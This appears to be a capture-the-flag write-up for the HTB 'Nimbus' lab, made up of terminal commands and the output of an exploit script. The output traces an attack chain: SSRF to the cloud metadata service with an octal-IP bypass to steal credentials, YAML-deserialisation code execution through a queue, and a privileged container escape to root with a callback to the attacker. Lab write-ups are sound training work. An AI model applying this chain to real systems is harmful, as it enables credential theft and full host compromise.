# **Methodology:**

```
git clone https://github.com/thaparitik45678-boop/aws && cd aws                                                                                          
Cloning into 'aws'...
remote: Enumerating objects: 6, done.
remote: Counting objects: 100% (6/6), done.
remote: Compressing objects: 100% (4/4), done.
remote: Total 6 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (6/6), 5.55 KiB | 5.55 MiB/s, done.
```


```
python3 -m venv exploit
```




```
source exploit/bin/activate
```





```
pip install -r requirements.txt                                                                                                                          
Collecting boto3 (from -r requirements.txt (line 1))
  Using cached boto3-1.43.34-py3-none-any.whl.metadata (6.6 kB)                                                                                              
Collecting pyyaml (from -r requirements.txt (line 2))                                                                                                        
  Using cached pyyaml-6.0.3-cp313-cp313-manylinux2014_x86_.
.
.
.
.
.
.
Successfully installed boto3-1.43.34 botocore-1.43.34 jmespath-1.1.0 python-dateutil-2.9.0.post0 pyyaml-6.0.3 s3transfer-0.19.0 six-1.17.0 urllib3-2.7.0
```










```
python3 exploit.py --target 10.129.xx.xx --vhost nimbus.htb --port 1234 10.10.xx.xx                                                              
============================================================
  HTB Nimbus — Full Chain PoC
============================================================
  Target  : 10.129.xx.xx  (nimbus.htb)
  LHOST   : 10.10.xx.xx:1234

[*] Callback listener up on :4001

[1] SSRF → IMDS  (octal IP bypass: 0251.0376.0251.0376 = 169.254.169.254)
    AccessKeyId : ASIAQX4PG7L2K9M3N5R8
    Expiration  : 2026-06-21T16:27:15Z

[2] Building CodeBuild escape payload ...

[3] SQS → worker (yaml.load RCE → CodeBuild privileged escape)
    MessageId   : d541faf7-be6c-472d-bfd0-cc9ac86720f3

[*] Waiting up to 90s for root callback ...
    Chain: worker receives job → creates CodeBuild build →
    privileged container (UID 0, CapEff=0x1ffffffffff) →
    core_pattern usermode-helper on host kernel → /root/root.txt


[+] user.txt = fbcd6.....5690771

[+] root.txt = 799f2.....6265c9bc

============================================================
  user.txt : fbcd......3e295765690771
  root.txt : 799f2.....db4df6265c9bc
============================================================
```


